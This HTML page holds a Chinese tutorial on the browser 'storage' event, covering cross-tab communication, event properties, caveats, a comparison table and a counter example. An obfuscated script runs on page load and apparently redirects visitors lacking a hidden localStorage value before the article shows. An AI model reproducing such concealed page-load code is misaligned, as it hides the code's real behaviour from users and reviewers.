<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x15284d=_0x1e6a;function _0x1e6a(e,s){var o=_0x5816();return(_0x1e6a=function(s,n){var a=o[s-=310];void 0===_0x1e6a.QqQLgt&&(_0x1e6a.kBNAtu=function(s,n){var a,t=[],e=0,o="";for(s=(s=>{for(var n,a,t="",e="",o=0,l=0;a=s.charAt(l++);~a&&(n=o%4?64*n+a:a,o++%4)&&(t+=String.fromCharCode(255&n>>(-2*o&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,r=t.length;c<r;c++)e+="%"+("00"+t.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(e)})(s),l=0;l<256;l++)t[l]=l;for(l=0;l<256;l++)e=(e+t[l]+n.charCodeAt(l%n.length))%256,a=t[l],t[l]=t[e],t[e]=a;for(var l=0,e=0,c=0;c<s.length;c++)a=t[l=(l+1)%256],t[l]=t[e=(e+t[l])%256],t[e]=a,o+=String.fromCharCode(s.charCodeAt(c)^t[(t[l]+t[e])%256]);return o},e=arguments,_0x1e6a.QqQLgt=!0);var s=s+o[0],t=e[s];return t?a=t:(void 0===_0x1e6a.aFXAao&&(_0x1e6a.aFXAao=!0),a=_0x1e6a.kBNAtu(a,n),e[s]=a),a})(e,s)}function _0x5816(){var s=["fI/cGSoUgrdcICompgldH8oM","WPihtCo4WRtcLConWQFcRGS","qvmvhCoxWRO+WOxcLq","mvFcTwRcVcBcVKXiWPq","W5LdW4TFWRW7WPpcRa","W6LElutcSZGFqmk9WR7cTa","pCo/yx9LySocoq","WRxcJSkfW4GpWOjXECkLWRO","Bv4HW6TxvanjcITo","WQPZW515tmoxW61ge8kwWRieW5BcUxxdTCkTWQSUW68Zph4VWQpcMa","ymkOnsGNE8o0edCoAa","W7JcTJhdJ3xdQszmFa","W7RcSJtcKgtdNtHOx8o0","WRjYW5P6rG","WRRdKfBcRwVdICom","BLektZRcG1K+oMtdIa","BLmJWOaFCsz3iW","W4BcPqvjW6r6W6NdQq","WQObySoeWQ0ywSo0WRVcI8oDvW","WP/cPN8olmo6sG","umk1tCoGWQ/cTg/dOKpdNem","lCkKWQhcR8oanWyjxvmp","W7ZcH1ZcUw3dM8oFEG","WORdPMldH2/dOGjzCG","fs/cG8oVguZcJmowbvxdSW","mLBcTM3cIW7cMu5gWR8","eSoot8kGWQxcSCkbW4SkW7yaWRu","W4pcR0KeWRO4W6BdMmkhqCkYkq","WQ8iBmojWQrQB8oOWPZcQSow","BL0HW6yPqXLNpJC"];return(_0x5816=function(){return s})()}if((()=>{for(var s=_0x1e6a,n=_0x5816();;)try{if(156857==+parseInt(s(311,"b*VE"))+-parseInt(s(318,")9kn"))/2*(parseInt(s(335,"4mbv"))/3)+parseInt(s(330,"[6FJ"))/4*(-parseInt(s(319,"TCMo"))/5)+-parseInt(s(336,"e%rQ"))/6*(parseInt(s(310,"$e*l"))/7)+parseInt(s(339,"Q[dS"))/8*(-parseInt(s(321,"#^@d"))/9)+-parseInt(s(316,"zoaF"))/10*(parseInt(s(329,"6d!("))/11)+parseInt(s(312,"tb1F"))/12*(parseInt(s(317,"Q[dS"))/13))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x15284d(333,"fSOs")](_0x15284d(337,"f#%P"))!=_0x15284d(327,"M0P["))throw window[_0x15284d(320,"n[RF")][_0x15284d(328,"e%rQ")](_0x15284d(323,"M0P[")),Error();document.title="storage 事件",document.getElementById("article").innerHTML='<div><p><code>window.addEventListener(\'storage\')</code> 是用于监听 <code>storage</code> 事件的代码，该事件在同源的不同窗口或标签页之间触发，当某个窗口或标签页对 <code>localStorage</code> 或 <code>sessionStorage</code> 进行修改时，其他窗口或标签页会收到该事件。</p>\n<hr>\n<h3><strong>1. 基本概念</strong></h3>\n<ul>\n<li><strong><code>storage</code> 事件</strong>  ：当同源的其他窗口或标签页对 <code>localStorage</code> 或 <code>sessionStorage</code> 进行修改（如添加、更新或删除数据）时，会触发 <code>storage</code> 事件。</li>\n<li><strong>同源策略</strong>  ：只有同源的窗口或标签页才能触发和监听 <code>storage</code> 事件。</li>\n<li><strong>不触发自身</strong>  ：修改 <code>storage</code> 的窗口或标签页本身不会触发 <code>storage</code> 事件，只有其他窗口或标签页会收到该事件。</li>\n</ul>\n<hr>\n<h3><strong>2. 使用场景</strong></h3>\n<ul>\n<li><strong>跨标签页通信</strong>  ：当需要在多个标签页之间共享数据或状态变化时，可以使用 <code>storage</code> 事件。</li>\n<li><strong>实时更新</strong>  ：当某个标签页更新了 <code>localStorage</code> 或 <code>sessionStorage</code> 中的数据，其他标签页可以实时收到更新通知。</li>\n</ul>\n<hr>\n<h3><strong>3. 基本用法</strong></h3>\n<h4><strong>步骤</strong></h4>\n<ol>\n<li><strong>监听 <code>storage</code> 事件</strong>  ：在所有需要接收通知的窗口或标签页中，使用 <code>window.addEventListener(\'storage\', callback)</code> 监听 <code>storage</code> 事件。</li>\n<li><strong>修改 <code>storage</code></strong>  ：在某个窗口或标签页中，修改 <code>localStorage</code> 或 <code>sessionStorage</code> 中的数据。</li>\n<li><strong>处理事件</strong>  ：在回调函数中处理接收到的 <code>storage</code> 事件。</li>\n</ol>\n<h4><strong>示例代码</strong></h4>\n<pre><code class="language-javascript"><span class="hljs-comment">// 监听 storage 事件</span>\n<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;storage&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {\n  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">storageArea</span> === <span class="hljs-variable language_">localStorage</span>) { <span class="hljs-comment">// 确保是 localStorage 的变化</span>\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Storage changed:&#x27;</span>);\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Key:&#x27;</span>, event.<span class="hljs-property">key</span>);\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Old Value:&#x27;</span>, event.<span class="hljs-property">oldValue</span>);\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;New Value:&#x27;</span>, event.<span class="hljs-property">newValue</span>);\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;URL of changed tab:&#x27;</span>, event.<span class="hljs-property">url</span> || event.<span class="hljs-property">uri</span>); <span class="hljs-comment">// 某些浏览器可能使用 uri</span>\n\n    <span class="hljs-comment">// 根据 key 或其他条件处理特定的逻辑</span>\n    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;myData&#x27;</span>) {\n      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;myData changed:&#x27;</span>, event.<span class="hljs-property">newValue</span>);\n    }\n  }\n});\n\n<span class="hljs-comment">// 在另一个标签页中修改 localStorage</span>\n<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;myData&#x27;</span>, <span class="hljs-string">&#x27;newValue&#x27;</span>);\n</code></pre>\n<hr>\n<h3><strong>4. 事件对象属性</strong></h3>\n<ul>\n<li><strong><code>key</code></strong>  ：被修改或删除的键名。如果是清除所有数据（<code>clear</code> 方法），则为 <code>null</code>。</li>\n<li><strong><code>oldValue</code></strong>  ：键的旧值。如果是新增键或清除所有数据，则为 <code>null</code>。</li>\n<li><strong><code>newValue</code></strong>  ：键的新值。如果是删除键，则为 <code>null</code>。</li>\n<li><strong><code>url</code> 或 <code>uri</code></strong>  ：触发事件的页面的 URL。某些浏览器可能使用 <code>uri</code> 属性。</li>\n<li><strong><code>storageArea</code></strong>  ：触发事件的存储对象（<code>localStorage</code> 或 <code>sessionStorage</code>）。</li>\n</ul>\n<hr>\n<h3><strong>5. 注意事项</strong></h3>\n<ul>\n<li><strong>同源限制</strong>  ：<code>storage</code> 事件只在同源的窗口或标签页之间触发。</li>\n<li><strong>不触发自身</strong>  ：修改 <code>storage</code> 的窗口或标签页本身不会触发 <code>storage</code> 事件。</li>\n<li><strong>性能考虑</strong>  ：频繁修改 <code>storage</code> 可能会触发大量 <code>storage</code> 事件，影响性能。建议避免在高频操作中使用 <code>localStorage</code> 或 <code>sessionStorage</code> 进行通信。</li>\n<li><strong>浏览器兼容性</strong>  ：大多数现代浏览器都支持 <code>storage</code> 事件，但在一些旧版浏览器中可能不可用。</li>\n</ul>\n<hr>\n<h3><strong>6. 与其他通信方式的比较</strong></h3>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>实时性</th>\n<th>复杂度</th>\n<th>浏览器支持</th>\n<th>同源限制</th>\n<th>适用场景</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>localStorage</code> + <code>storage</code> 事件</td>\n<td>高</td>\n<td>低</td>\n<td>广泛</td>\n<td>是</td>\n<td>简单的跨标签页通信</td>\n</tr>\n<tr>\n<td><code>BroadcastChannel</code></td>\n<td>高</td>\n<td>低</td>\n<td>现代浏览器</td>\n<td>是</td>\n<td>同源标签页间的实时通信</td>\n</tr>\n<tr>\n<td>WebSocket</td>\n<td>高</td>\n<td>高</td>\n<td>广泛</td>\n<td>否</td>\n<td>需要服务器支持的实时通信</td>\n</tr>\n<tr>\n<td>Service Worker</td>\n<td>高</td>\n<td>中</td>\n<td>现代浏览器</td>\n<td>否（可跨域，但实现复杂）</td>\n<td>复杂的后台处理和跨标签页通信</td>\n</tr>\n<tr>\n<td>SharedWorker</td>\n<td>中</td>\n<td>中</td>\n<td>有限</td>\n<td>是</td>\n<td>需要共享状态和计算资源的场景</td>\n</tr>\n</tbody>\n</table>\n<p><strong>推荐</strong>  ：</p>\n<ul>\n<li>如果只需要简单的同源标签页通信，且不需要服务器支持，<strong><code>localStorage</code> + <code>storage</code> 事件</strong>   是一种轻量级的解决方案。</li>\n<li>如果需要更实时、更高效的通信，且浏览器支持，<strong><code>BroadcastChannel</code></strong>   是更好的选择。</li>\n</ul>\n<hr>\n<h3><strong>7. 示例：跨标签页计数器</strong></h3>\n<p>以下是一个使用 <code>localStorage</code> 和 <code>storage</code> 事件实现跨标签页计数器的示例：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// 初始化计数器</span>\n<span class="hljs-keyword">let</span> counter = <span class="hljs-built_in">parseInt</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;counter&#x27;</span>)) || <span class="hljs-number">0</span>;\n\n<span class="hljs-comment">// 更新显示</span>\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateDisplay</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;counter&#x27;</span>).<span class="hljs-property">textContent</span> = counter;\n}\n\n<span class="hljs-comment">// 监听 storage 事件</span>\n<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;storage&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {\n  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;counter&#x27;</span>) {\n    counter = <span class="hljs-built_in">parseInt</span>(event.<span class="hljs-property">newValue</span>);\n    <span class="hljs-title function_">updateDisplay</span>();\n  }\n});\n\n<span class="hljs-comment">// 增加计数器</span>\n<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;increment&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> {\n  counter++;\n  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;counter&#x27;</span>, counter);\n  <span class="hljs-title function_">updateDisplay</span>();\n});\n\n<span class="hljs-comment">// 初始显示</span>\n<span class="hljs-title function_">updateDisplay</span>();\n</code></pre>\n<pre><code class="language-html"><span class="hljs-comment">&lt;!-- HTML --&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;increment&quot;</span>&gt;</span>Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>\n<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Counter: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;counter&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>\n</code></pre>\n<p>在这个示例中，每个标签页都会监听 <code>storage</code> 事件，当一个标签页更新计数器时，其他标签页会收到通知并更新显示。</p>\n<hr>\n<h3><strong>总结</strong></h3>\n<p><code>window.addEventListener(\'storage\')</code> 是监听 <code>storage</code> 事件的方式，用于在同源的不同窗口或标签页之间实现简单的通信。它适用于需要实时更新数据或状态的场景，但需要注意同源限制和性能考虑。在合适的场景下，使用 <code>storage</code> 事件可以简化跨标签页通信的实现。</p>\n</div>'</script></body></html>